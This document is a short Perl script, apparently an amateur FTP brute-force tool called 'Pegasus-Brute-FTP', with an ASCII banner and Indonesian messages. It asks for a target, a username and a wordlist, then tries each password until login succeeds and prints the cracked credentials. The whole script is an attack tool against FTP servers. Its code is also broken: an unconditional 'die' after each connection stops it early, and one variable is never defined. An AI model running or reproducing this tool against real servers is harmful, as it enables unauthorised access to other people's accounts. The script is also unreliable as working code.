#!/usr/bin/perl
use Net::FTP;
# Coded by Pegasus
# www.dohamupretoragean.ga
# dr.Muhammad Sobri Maulana, CEH, OSCP
# Pegasus-Brute-FTP
system ("clear");
system ("cls");
system ("color 72");
print "Coded by Pegasus
__________
\______   \ ____   _________    ________ __  ______ 
 |     ___// __ \ / ___\__  \  /  ___/  |  \/  ___/  
 |    |   \  ___// /_/  > __ \_\___ \|  |  /\___ \  
 |____|    \___  >___  (____  /____  >____//____  >   
               \/_____/     \/     \/           \/\n";
print "\n";
print "Pegasus-brute-ftp\n";
print "\n";
sleep 1;
print "Target: ";
$target=<STDIN>;
print "\n\n";
print "User: ";
$user=<STDIN>;
print "\n\n";
print "Dictionary: ";
$dict=<STDIN>;
print "\n\n";
$counter=0;
$times=0;
print "Tersambung $target\n";
print "\n";
$ftp = Net::FTP->new($target,Debug => 1);
die "Sulit di crack $target\n";
print "\n";
open (D,"<$dict") or die "Dictionary tidak ditemukan\n";
while(<D>)
{
$try = $_;
    chomp $try;
    $ftp->login($user,$try);
    $counter++;
    $tiempo++;
    if($ftp->ls("."))
    {
	print "$user / $try \n";
	last;
    }
    if($counter==$fallos)
    {
print "\n\n";
	$ftp->quit;
	print "Terhubung Kembali $target";
	$ftp = Net::FTP->new($target,Debug => 1);
	die "Tidak dapat terhubung $target\n";
print "\n\n";
	$counter=0;
    }
}
close(D);
print "\n\n";
print "$tiempo Dapat Password";
print "\n\n";
print "Coded by Pegasus";

